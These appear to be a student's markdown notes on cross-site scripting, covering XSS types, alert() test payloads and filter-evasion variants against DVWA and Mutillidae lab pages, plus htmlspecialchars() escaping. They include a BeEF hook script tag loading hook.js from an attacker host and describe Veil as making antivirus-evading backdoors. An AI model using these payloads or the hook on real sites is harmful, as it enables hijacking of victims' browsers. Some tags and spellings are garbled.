# XSS Vulns

## XSS - Cross Site Scripting Vulns

1. Allow an attacker to inject javascript into the page
2. Code is execute when the page loads
3. Code is executed on the CLIENT machine not the SERVER

## Three main types:

1. Persistent/Stored XSS
2. Reflected XSS
3. DOM based XSS

## Discovering XSS:

1. Try to inject JS code into the pages
2. Test text boxes and url parameters on the form
   => http://target.com/page.php?something=something

### Reflected XSS:

1. None persistent, not stored
2. Only works if the target visits a specially crafted url
   => http://target.com/page.php?something=<
   script>alert('XSS')</script>
   => http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%22xss%22)%3C/script%3E#

#### Advanced Reflected XSS:

cheat sheet : https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

<
sCriPt>alert('XSS')</
sCriPT>

<
a onmounseover="alert('xss')">xss links</
a>
<
img SRC=# onmouseover="alert('xss')">

<
img SRC=/ onerror="alert('xss')"></
img>

See this code http://ID_ADRESS/mutillidae/index.php?page=password-generator.php&username=anonymous
typically when can inject XSS instead of 'anonymous' at the end
Seeing the following code :

<
script>
try{
document.getElementById("idUsernameInput").innerHTML = "This password is for anonymous
}catch(e){
alert("Error: " + e.message);
}// end catch
</
script>

We modified our XSS injection to :
http://IP_ADDRESS/mutillidae/index.php?page=password-generator.php&username=" ; alert('XSS');//

### Stored XSS

1. Persistent, stored on the page or DB.
2. The injected code is executed everytime the page is loaded.

Using charCode to run our XSS

<
sCriPt>alert(string.fromCharCode(120, 115, 115, 50))<
/sCriPT>

## Exploiting XSS - BEEF Framework

1. Run any javascript code
2. Targets can be hooked to beef using javascript code
3. Browser Exploitation Framework allowing us to launch a number of attacks on a hooked target

=> Inject Beef hook in vulnerable pages
=> Execute commands from BEEF

All you have to is to inject this code
< script src="http://< IP>:3000/hook.js"></ script>

## Exploiting XSS - VEIL - Framework

1. A backdoor is a file that gives full control over the machine that it gets executed on.
2. Backdoors can be caught by Anti-Virus programs.
3. Veil is a framework generating Undetectable backdoors.

## Preventing XSS Vulns

1. Minimize the usage of user input on html.
2. Escape any untrusted input before inserting it into the page.

The input is filtered by the function htmlspecialchars(). It convers everything to hmtl code.

< ?php

if(!array_key_exists ("name", $_GET) || $\_GET['name'] == NULL || $_GET['name'] == ''){
    
 $isempty = true;

} else {

echo '< pre>';

echo 'Hello ' . htmlspecialchars(\$\_GET['name']);

echo '</ pre>';

}

?>
